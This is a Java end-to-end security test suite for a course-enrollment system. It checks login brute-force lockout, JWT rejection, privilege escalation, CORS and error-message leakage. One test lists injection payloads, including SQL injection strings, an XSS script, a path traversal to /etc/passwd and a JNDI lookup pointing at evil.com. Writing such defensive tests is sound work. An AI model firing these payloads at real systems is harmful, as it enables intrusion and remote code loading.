package com.enrollment.e2e;

import com.enrollment.e2e.util.JwtTestUtil;
import com.enrollment.e2e.util.TestDataFactory;
import io.restassured.RestAssured;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.TestInstance;

import java.util.Map;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;

import static org.assertj.core.api.Assertions.assertThat;
import static org.hamcrest.Matchers.*;

/**
 * End-to-end tests for security attack scenarios.
 * Tests system resilience against common security attacks.
 */
@TestInstance(TestInstance.Lifecycle.PER_CLASS)
@DisplayName("Security Attack End-to-End Tests")
public class SecurityAttackE2ETest extends BaseE2ETest {
    
    private String validStudentToken;
    private String validFacultyToken;
    private String studentEmail;
    private String facultyEmail;
    
    @BeforeAll
    void setupValidUsers() {
        // Create legitimate users for testing
        Map<String, Object> studentData = TestDataFactory.createStudentRegistration();
        Map<String, Object> facultyData = TestDataFactory.createFacultyRegistration();
        
        registerUser(studentData);
        registerUser(facultyData);
        
        studentEmail = (String) studentData.get("email");
        facultyEmail = (String) facultyData.get("email");
        
        validStudentToken = loginAndGetToken(studentEmail, (String) studentData.get("password"));
        validFacultyToken = loginAndGetToken(facultyEmail, (String) facultyData.get("password"));
    }
    
    @Test
    @DisplayName("Should protect against brute force login attacks")
    void shouldProtectAgainstBruteForce() throws InterruptedException {
        // Create a target user
        Map<String, Object> targetUser = TestDataFactory.createStudentRegistration();
        registerUser(targetUser);
        String targetEmail = (String) targetUser.get("email");
        
        // Simulate brute force attack with concurrent attempts
        int numberOfThreads = 10;
        int attemptsPerThread = 2;
        ExecutorService executor = Executors.newFixedThreadPool(numberOfThreads);
        CountDownLatch latch = new CountDownLatch(numberOfThreads);
        AtomicInteger failedAttempts = new AtomicInteger(0);
        AtomicInteger lockedResponses = new AtomicInteger(0);
        
        for (int i = 0; i < numberOfThreads; i++) {
            executor.submit(() -> {
                try {
                    for (int j = 0; j < attemptsPerThread; j++) {
                        int statusCode = RestAssured
                                .given()
                                    .spec(createRequestSpec())
                                    .body(TestDataFactory.createLoginRequest(
                                        targetEmail, "WrongPassword" + j))
                                .when()
                                    .post(AUTH_BASE_URL + LOGIN_ENDPOINT)
                                .then()
                                    .extract()
                                    .statusCode();
                        
                        if (statusCode == 401) {
                            String error = RestAssured
                                    .given()
                                        .spec(createRequestSpec())
                                        .body(TestDataFactory.createLoginRequest(
                                            targetEmail, "WrongPassword" + j))
                                    .when()
                                        .post(AUTH_BASE_URL + LOGIN_ENDPOINT)
                                    .then()
                                        .extract()
                                        .jsonPath()
                                        .getString("error");
                            
                            if (error.contains("locked")) {
                                lockedResponses.incrementAndGet();
                            } else {
                                failedAttempts.incrementAndGet();
                            }
                        }
                    }
                } finally {
                    latch.countDown();
                }
            });
        }
        
        latch.await();
        executor.shutdown();
        
        // Verify account is locked after threshold
        assertThat(lockedResponses.get()).isGreaterThan(0);
        
        // Verify legitimate login also fails while locked
        RestAssured
                .given()
                    .spec(createRequestSpec())
                    .body(TestDataFactory.createLoginRequest(
                        targetEmail, (String) targetUser.get("password")))
                .when()
                    .post(AUTH_BASE_URL + LOGIN_ENDPOINT)
                .then()
                    .statusCode(401)
                    .body("error", containsString("locked"));
    }
    
    @Test
    @DisplayName("Should reject expired JWT tokens across all services")
    void shouldRejectExpiredTokens() {
        String expiredToken = "expired-token";
        
        // Test Auth Service
        RestAssured
                .given()
                    .spec(createAuthenticatedRequestSpec(expiredToken))
                .when()
                    .post(AUTH_BASE_URL + REAUTHENTICATE_ENDPOINT)
                .then()
                    .statusCode(403);
        
        // Test Course Service
        RestAssured
                .given()
                    .spec(createAuthenticatedRequestSpec(expiredToken))
                .when()
                    .get(COURSE_BASE_URL + "/api/courses")
                .then()
                    .statusCode(403);
        
        // Test Enrollment Service
        RestAssured
                .given()
                    .spec(createAuthenticatedRequestSpec(expiredToken))
                .when()
                    .get(ENROLLMENT_BASE_URL + "/api/enrollments/student/" + studentEmail)
                .then()
                    .statusCode(403);
        
        // Test Grade Service
        RestAssured
                .given()
                    .spec(createAuthenticatedRequestSpec(expiredToken))
                .when()
                    .get(GRADE_BASE_URL + "/api/grades/student/" + studentEmail)
                .then()
                    .statusCode(403);
    }
    
    @Test
    @DisplayName("Should reject manipulated JWT tokens")
    void shouldRejectManipulatedTokens() {
        // Token signed with wrong key
        String invalidToken = "invalid-token";
        
        // Try to access protected resources with invalid token
        RestAssured
                .given()
                    .spec(createAuthenticatedRequestSpec(invalidToken))
                .when()
                    .get(COURSE_BASE_URL + "/api/courses")
                .then()
                    .statusCode(403);
        
        // Try to perform privileged operations
        RestAssured
                .given()
                    .spec(createAuthenticatedRequestSpec(invalidToken))
                    .body(TestDataFactory.createCourse("hacker@test.com"))
                .when()
                    .post(COURSE_BASE_URL + "/api/courses")
                .then()
                    .statusCode(403);
    }
    
    @Test
    @DisplayName("Should prevent privilege escalation attempts")
    void shouldPreventPrivilegeEscalation() {
        // Student tries to manually craft admin-like requests
        
        // Attempt 1: Try to access admin endpoints with student token
        RestAssured
                .given()
                    .spec(createAuthenticatedRequestSpec(validStudentToken))
                .when()
                    .get(ENROLLMENT_BASE_URL + "/api/enrollments") // Admin/Faculty only
                .then()
                    .statusCode(403);
        
        // Attempt 2: Try to modify own role (if such endpoint existed)
        // This would be a critical vulnerability if allowed
        
        // Attempt 3: Try to submit grades as student
        RestAssured
                .given()
                    .spec(createAuthenticatedRequestSpec(validStudentToken))
                    .body(TestDataFactory.createGrade(studentEmail, "course123", 100.0))
                .when()
                    .post(GRADE_BASE_URL + "/api/grades")
                .then()
                    .statusCode(403);
        
        // Attempt 4: Try to delete courses as student
        RestAssured
                .given()
                    .spec(createAuthenticatedRequestSpec(validStudentToken))
                .when()
                    .delete(COURSE_BASE_URL + "/api/courses/any-course-id")
                .then()
                    .statusCode(403);
    }
    
    @Test
    @DisplayName("Should handle malicious input injection attempts")
    void shouldHandleMaliciousInput() {
        // Test SQL injection attempts (though we use MongoDB)
        String[] maliciousInputs = {
            "'; DROP TABLE users; --",
            "admin' OR '1'='1",
            "<script>alert('XSS')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "\\x00\\x01\\x02\\x03",
            "%00",
            "{{7*7}}"
        };
        
        for (String maliciousInput : maliciousInputs) {
            // Try injection in login
            RestAssured
                    .given()
                        .spec(createRequestSpec())
                        .body(Map.of(
                            "email", maliciousInput,
                            "password", maliciousInput
                        ))
                    .when()
                        .post(AUTH_BASE_URL + LOGIN_ENDPOINT)
                    .then()
                        .statusCode(anyOf(is(400), is(401)))
                        .body("error", equalTo("Invalid username and/or password"));
            
            // Try injection in registration
            Map<String, Object> maliciousRegistration = TestDataFactory.createStudentRegistration();
            maliciousRegistration.put("email", maliciousInput + "@test.com");
            maliciousRegistration.put("firstName", maliciousInput);
            
            RestAssured
                    .given()
                        .spec(createRequestSpec())
                        .body(maliciousRegistration)
                    .when()
                        .post(AUTH_BASE_URL + REGISTER_ENDPOINT)
                    .then()
                        .statusCode(400)
                        .body("error", equalTo("Invalid input data provided"));
        }
    }
    
    @Test
    @DisplayName("Should protect against CORS attacks")
    void shouldProtectAgainstCORSAttacks() {
        // Test unauthorized origin
        RestAssured
                .given()
                    .header("Origin", "http://evil-site.com")
                    .spec(createAuthenticatedRequestSpec(validStudentToken))
                .when()
                    .get(COURSE_BASE_URL + "/api/courses")
                .then()
                    .statusCode(403);
        
        // Test preflight requests from unauthorized origin
        RestAssured
                .given()
                    .header("Origin", "http://evil-site.com")
                    .header("Access-Control-Request-Method", "POST")
                .when()
                    .options(COURSE_BASE_URL + "/api/courses")
                .then()
                    .statusCode(403);
        
        // Verify legitimate origin works
        RestAssured
                .given()
                    .header("Origin", "http://localhost:3000")
                    .spec(createAuthenticatedRequestSpec(validStudentToken))
                .when()
                    .get(COURSE_BASE_URL + "/api/courses")
                .then()
                    .statusCode(200);
    }
    
    @Test
    @DisplayName("Should handle service availability under attack")
    void shouldHandleServiceAvailability() throws InterruptedException {
        // Simulate DDoS-like scenario with many concurrent requests
        int numberOfRequests = 50;
        ExecutorService executor = Executors.newFixedThreadPool(10);
        CountDownLatch latch = new CountDownLatch(numberOfRequests);
        AtomicInteger successfulRequests = new AtomicInteger(0);
        AtomicInteger failedRequests = new AtomicInteger(0);
        
        for (int i = 0; i < numberOfRequests; i++) {
            executor.submit(() -> {
                try {
                    int statusCode = RestAssured
                            .given()
                                .spec(createAuthenticatedRequestSpec(validStudentToken))
                            .when()
                                .get(COURSE_BASE_URL + "/api/courses")
                            .then()
                                .extract()
                                .statusCode();
                    
                    if (statusCode == 200) {
                        successfulRequests.incrementAndGet();
                    } else {
                        failedRequests.incrementAndGet();
                    }
                } finally {
                    latch.countDown();
                }
            });
        }
        
        latch.await();
        executor.shutdown();
        
        // Verify service remains available
        assertThat(successfulRequests.get()).isGreaterThan(0);
        
        // Verify legitimate requests still work after "attack"
        RestAssured
                .given()
                    .spec(createAuthenticatedRequestSpec(validFacultyToken))
                .when()
                    .get(COURSE_BASE_URL + "/api/courses")
                .then()
                    .statusCode(200);
    }
    
    @Test
    @DisplayName("Should not expose sensitive information in errors")
    void shouldNotExposeSensitiveInfo() {
        // Test various error scenarios
        
        // Invalid endpoint should not reveal system info
        RestAssured
                .given()
                    .spec(createAuthenticatedRequestSpec(validStudentToken))
                .when()
                    .get(COURSE_BASE_URL + "/api/courses/../../admin/config")
                .then()
                    .statusCode(anyOf(is(400), is(404)))
                    .body("stackTrace", nullValue())
                    .body("trace", nullValue())
                    .body("path", nullValue());
        
        // Database errors should not expose schema
        RestAssured
                .given()
                    .spec(createAuthenticatedRequestSpec(validFacultyToken))
                    .body(Map.of("invalidField", "value"))
                .when()
                    .post(COURSE_BASE_URL + "/api/courses")
                .then()
                    .statusCode(400)
                    .body("error", not(containsString("MongoDB")))
                    .body("error", not(containsString("database")))
                    .body("error", equalTo("Invalid input data provided"));
        
        // Authentication errors should be generic
        RestAssured
                .given()
                    .spec(createRequestSpec())
                    .body(TestDataFactory.createLoginRequest(
                        "nonexistent@test.com", "password"))
                .when()
                    .post(AUTH_BASE_URL + LOGIN_ENDPOINT)
                .then()
                    .statusCode(401)
                    .body("error", equalTo("Invalid username and/or password"))
                    .body("error", not(containsString("user not found")));
    }
}